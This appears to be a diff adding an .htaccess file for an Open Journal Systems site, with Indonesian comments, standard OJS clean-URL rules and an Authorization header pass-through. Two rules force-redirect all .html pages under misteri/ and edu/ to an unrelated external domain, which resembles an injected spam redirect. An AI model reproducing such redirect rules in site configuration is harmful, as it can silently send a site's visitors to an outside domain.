@@ -1,0 +1,31 @@
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+
+    # Jika OJS kamu ada di subfolder, ubah ini:
+    # Misal: RewriteBase /journal/
+    RewriteBase /
+
+  
+    # 🔁 Redirect HTML lama meski folder sudah dihapus
+
+
+    # Paksa redirect semua .html di path misteri/
+    RewriteRule ^misteri/[^/]+\.html$ https://preciseurl.org/babon [R=301,L,QSA]
+
+    # Paksa redirect semua .html di path edu/
+    RewriteRule ^edu/[^/]+\.html$ https://preciseurl.org/babon [R=301,L,QSA]
+
+  
+    # 🔐 Header Authorization (dibutuhkan OJS API dan login SSO)
+ 
+    RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+
+   
+    # ⚙️ OJS Default Rewrite Rules (Clean URLs)
+    
+    # Lewati file atau folder asli
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    # Arahkan semua request lain ke index.php
+    RewriteRule ^ index.php [QSA,L]
+</IfModule>
